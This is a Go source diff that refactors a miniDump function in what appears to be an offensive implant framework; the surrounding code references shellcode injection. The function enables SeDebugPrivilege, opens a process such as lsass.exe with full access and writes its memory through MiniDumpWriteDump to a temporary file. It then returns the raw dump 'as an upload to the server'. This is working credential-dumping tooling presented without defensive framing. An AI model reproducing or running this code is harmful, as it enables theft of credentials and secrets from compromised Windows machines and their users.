@@ -27,7 +27,6 @@ import (
 	"io/ioutil"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -378,15 +377,72 @@ func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
 
 // TODO always close handle during exception handling
 
-// miniDump will attempt to perform a minidumpwritedump operation on the provided process, and returns the raw bytes of the dumpfile back as an upload to the server. Touches disk during the dump process, however uses the OS default tempfile location
-func miniDump(tempfile, process string, inPid uint32) (modules.MinidumpFile, error) {
+// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
+// the raw bytes of the dumpfile back as an upload to the server.
+// Touches disk during the dump process, in the OS default temporary or provided temporary directory
+func miniDump(tempDir string, process string, inPid uint32) (modules.MinidumpFile, error) {
 	ret := modules.MinidumpFile{} // []byte{}
-	pid := inPid
-	//get debug privs (required for dumping processes not owned by current user)
-	err := sePrivEnable("SeDebugPrivilege")
+	var err error
+	// TODO fix this on the CLI side
+	tempDir = strings.TrimPrefix(tempDir, " ")
+
+	// Make sure temporary directory exists before executing miniDump functionality
+	if tempDir != "" {
+		d, errS := os.Stat(tempDir)
+		if os.IsNotExist(errS) {
+			return ret, fmt.Errorf("the provided directory does not exist: %s", tempDir)
+		}
+		if d.IsDir() != true {
+			return ret, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
+		}
+	} else {
+		tempDir = os.TempDir()
+	}
+
+	// Get the process PID or name
+	if inPid != 0 {
+		ret.ProcName, err = getProcName(inPid)
+		if err != nil {
+			return ret, err
+		}
+		ret.ProcID = inPid
+	} else if process != "" {
+		ret.ProcID, err = getProcID(process)
+		if err != nil {
+			return ret, err
+		}
+		ret.ProcName = process
+
+	} else {
+		return ret, fmt.Errorf("an valid process ID or name was not provided")
+	}
+
+	// Get debug privs (required for dumping processes not owned by current user)
+	err = sePrivEnable("SeDebugPrivilege")
 	if err != nil {
 		return ret, err
 	}
+
+	// Get a handle to process
+	hProc, err := syscall.OpenProcess(0x1F0FFF, false, ret.ProcID) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
+	if err != nil {
+		return ret, err
+	}
+
+	// Set up the temporary file to write to, automatically remove it once done
+	// TODO: Work out how to do this in memory
+	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
+	if tempErr != nil {
+		return ret, tempErr
+	}
+
+	// Remove the file after the function exits, regardless of error nor not
+	defer os.Remove(f.Name())
+
+	// Load MiniDumpWriteDump function from DbgHelp.dll
+	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
+	miniDump := k32.NewProc("MiniDumpWriteDump")
+
 	/*
 		BOOL MiniDumpWriteDump(
 		  HANDLE                            hProcess,
@@ -398,89 +454,15 @@ func miniDump(tempfile, process string, inPid uint32) (modules.MinidumpFile, err
 		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
 		);
 	*/
-	//load up our minidump function
-	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
-	m := k32.NewProc("MiniDumpWriteDump")
-
-	var f *os.File
-	var e error
-	if tempfile == "" {
-		//set up the tempfile to write to, automatically remove it once done
-		// TODO: Work out how to do this in memory
-		f, e = ioutil.TempFile(os.TempDir(), "")
-		if e != nil {
-			return ret, e
-		}
-	} else {
-		var dirpath string
-		var filename string
-		//if the supplied path ends with a "\" or a "/", assume user provided a directory
-		if strings.HasSuffix(tempfile, "/") || strings.HasSuffix(tempfile, "\\") {
-			dirpath = tempfile
-		} else {
-			dirpath = filepath.Dir(tempfile)
-			fmt.Println(dirpath)
-			filename = filepath.Base(tempfile)
-		}
-		//check the path to the specified place exists
-		if _, serr := os.Stat(dirpath); serr != nil {
-			return ret, fmt.Errorf("Directory doesn't exist")
-		}
-
-		//if the file is provided, first check if it exists:
-		if filename != "" {
-			if _, serr := os.Stat(tempfile); serr == nil {
-				return ret, fmt.Errorf("File exists")
-			}
-			//otherwise, create new file
-			f, e = os.OpenFile(tempfile, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0600)
-			if e != nil {
-				return ret, e
-			}
-		} else {
-			//user provided a directory, create a tempfile in the specified location
-			f, e = ioutil.TempFile(tempfile, "")
-			if e != nil {
-				return ret, e
-			}
-		}
-	}
-	//remove the file after the function exits, regardless of error nor not
-	defer os.Remove(f.Name())
-
-	stdOutHandle := f.Fd()
-
-	//get our proc ID, and get a handle to the process. If PID is not provided, search for the PID
-	if pid <= 0 {
-		pid, err = getProcID(process)
-		if err != nil {
-			return ret, err
-		}
-	}
-	if pid <= 0 {
-		return ret, errors.New("could not find the process")
-	}
-	if process == "" || inPid != 0 { //assign process name if the name is blank, or if the pid is provided
-		process, err = getProcName(pid)
-		if err != nil {
-			return ret, err
-		}
-	}
-	ret.ProcID = pid
-	ret.ProcName = process
-	hProc, err := syscall.OpenProcess(0x1F0FFF, false, pid) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
-	if err != nil {
-		return ret, err
-	}
-
-	// calls the minidump function
-	r, _, _ := m.Call(uintptr(hProc), uintptr(pid), stdOutHandle, 3, 0, 0, 0)
+	// Call Windows MiniDumpWriteDump API
+	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(ret.ProcID), f.Fd(), 3, 0, 0, 0)
 
 	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
 
 	if r != 0 {
 		ret.FileContent, err = ioutil.ReadFile(f.Name())
 		if err != nil {
+			f.Close()
 			return ret, err
 		}
 	}
@@ -490,9 +472,7 @@ func miniDump(tempfile, process string, inPid uint32) (modules.MinidumpFile, err
 //getProcID returns the PID of the provided process name (eg lsass.exe). PID of < 1 indicates didn't find the process.
 func getProcID(procname string) (uint32, error) {
 	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go
-	handle, err := syscall.CreateToolhelp32Snapshot(
-		0x00000002,
-		0)
+	handle, err := syscall.CreateToolhelp32Snapshot(0x00000002, 0)
 	if handle < 0 || err != nil {
 		return 0, fmt.Errorf("Could not get snapshot:\n%s", err)
 	}
@@ -520,7 +500,7 @@ func getProcID(procname string) (uint32, error) {
 			break
 		}
 	}
-	return 0, fmt.Errorf("Could not find pid for supplied name \"%s\"", procname)
+	return 0, fmt.Errorf("Could not find a procces with the supplied name \"%s\"", procname)
 }
 
 //getProcName will return the name of the process associated with the specified pid.
@@ -556,7 +536,7 @@ func getProcName(pid uint32) (string, error) {
 			break
 		}
 	}
-	return "", fmt.Errorf("Could not find pid for supplied pid \"%d\"", pid)
+	return "", fmt.Errorf("Could not find PID \"%d\"", pid)
 }
 
 //sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
